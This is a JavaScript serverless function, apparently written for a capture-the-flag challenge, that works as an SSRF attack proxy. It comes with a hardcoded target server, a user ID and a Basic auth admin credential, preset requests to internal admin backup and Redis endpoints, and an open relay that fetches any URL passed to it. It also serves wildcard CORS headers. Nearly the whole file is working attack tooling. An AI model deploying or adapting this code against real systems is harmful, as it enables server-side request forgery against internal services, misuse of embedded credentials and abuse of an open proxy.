// api/proxy.js - Vercel serverless function
export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Configuration
    const config = {
        ctfServer: '15.206.47.5:5000',
        userId: 'f2f96855-8c05-4599-a98c-f7f2fd718fa2',
        basicAuth: 'YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu' // api-admin:ApiOnlyBasicToken
    };
    
    // Handle GET requests (direct SSRF targets)
    if (req.method === 'GET') {
        const { target, endpoint, url } = req.query;
        
        let targetUrl = url;
        
        // Handle predefined targets
        if (target === 'admin' || endpoint === 'admin') {
            targetUrl = `http://127.0.0.1:5000/api/admin/backup/generate`;
        } else if (target === 'redis' || endpoint === 'redis') {
            targetUrl = `http://127.0.0.1:6379/`;
        } else if (target === 'internal' || endpoint === 'internal') {
            targetUrl = `http://localhost:5000/api/admin/backup/generate`;
        }
        
        if (!targetUrl) {
            return res.status(200).json({
                message: 'SSRF Proxy Server Active',
                timestamp: new Date().toISOString(),
                config: {
                    ctfServer: config.ctfServer,
                    userId: config.userId,
                    hasAuth: !!config.basicAuth
                },
                usage: {
                    admin: '?target=admin',
                    redis: '?target=redis', 
                    internal: '?target=internal',
                    custom: '?url=TARGET_URL'
                }
            });
        }
        
        try {
            console.log(`SSRF Proxy: Making request to ${targetUrl}`);
            
            // Prepare headers
            const headers = {
                'User-Agent': 'SSRF-Proxy/1.0',
                'Accept': '*/*'
            };
            
            // Add auth for admin endpoints
            if (targetUrl.includes('admin') || targetUrl.includes('api')) {
                headers['Authorization'] = `Basic ${config.basicAuth}`;
                headers['Content-Type'] = 'application/json';
            }
            
            // Make the request
            let response;
            if (targetUrl.includes('admin') && !targetUrl.includes('redis')) {
                // POST request for admin endpoints
                response = await fetch(targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify({
                        user_id: config.userId
                    })
                });
            } else {
                // GET request for other endpoints
                response = await fetch(targetUrl, {
                    method: 'GET',
                    headers: headers
                });
            }
            
            const responseText = await response.text();
            
            console.log(`SSRF Proxy: Response from ${targetUrl}: ${response.status}`);
            
            // Return the response
            return res.status(200).send(`SSRF Proxy Response
Target: ${targetUrl}
Status: ${response.status}
Timestamp: ${new Date().toISOString()}

=== Response Body ===
${responseText}

=== Debug Info ===
Method: ${targetUrl.includes('admin') ? 'POST' : 'GET'}
Headers: ${JSON.stringify(headers, null, 2)}
${targetUrl.includes('admin') ? `Data: ${JSON.stringify({user_id: config.userId}, null, 2)}` : ''}
`);
            
        } catch (error) {
            console.error('SSRF Proxy error:', error);
            return res.status(500).send(`SSRF Proxy Error
Target: ${targetUrl}
Error: ${error.message}
Timestamp: ${new Date().toISOString()}
`);
        }
    }
    
    // Handle POST requests (for testing from the interface)
    if (req.method === 'POST') {
        const { url, method = 'GET', headers = {}, data } = req.body;
        
        if (!url) {
            return res.status(400).json({ error: 'URL is required' });
        }
        
        try {
            console.log(`API Proxy: Making ${method} request to ${url}`);
            
            const requestOptions = {
                method: method,
                headers: {
                    'User-Agent': 'API-Proxy/1.0',
                    ...headers
                }
            };
            
            if (data && (method === 'POST' || method === 'PUT')) {
                requestOptions.body = JSON.stringify(data);
            }
            
            const response = await fetch(url, requestOptions);
            const responseText = await response.text();
            
            console.log(`API Proxy: Response from ${url}: ${response.status}`);
            
            return res.status(response.status).json({
                success: response.ok,
                status: response.status,
                headers: Object.fromEntries(response.headers.entries()),
                body: responseText,
                timestamp: new Date().toISOString(),
                request: {
                    url: url,
                    method: method,
                    headers: requestOptions.headers
                }
            });
            
        } catch (error) {
            console.error('API Proxy error:', error);
            return res.status(500).json({
                success: false,
                error: error.message,
                timestamp: new Date().toISOString()
            });
        }
    }
    
    return res.status(405).json({ error: 'Method not allowed' });
}